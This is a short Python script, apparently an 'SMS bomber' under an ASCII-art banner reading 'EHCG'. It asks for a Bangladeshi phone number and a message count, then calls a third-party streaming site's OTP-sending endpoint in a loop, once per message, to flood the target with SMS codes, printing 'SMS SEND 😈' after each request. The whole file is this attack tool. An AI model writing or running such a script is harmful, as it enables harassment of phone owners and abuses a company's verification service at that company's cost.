import requests ,os
os.system("clear")

  ehcg= """

$$$$$$$$\ $$\   $$\  $$$$$$\   $$$$$$\  
$$  _____|$$ |  $$ |$$  __$$\ $$  __$$\ 
$$ |      $$ |  $$ |$$ /  \__|$$ /  \__|
$$$$$\    $$$$$$$$ |$$ |      $$ |$$$$\ 
$$  __|   $$  __$$ |$$ |      $$ |\_$$ |
$$ |      $$ |  $$ |$$ |  $$\ $$ |  $$ |
$$$$$$$$\ $$ |  $$ |\$$$$$$  |\$$$$$$  |
\________|\__|  \__| \______/  \______/ 
                                        
  """                                       
 print(ehcg)                                       

                                        
                                        
                                        

  
number=str(input(" Enter Ther number : "))
amount=int(input(" Enter SMS amount : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for i in range (amount):
  requests.get(api)
  print(str(i+1)+"SMS SEND 😈")
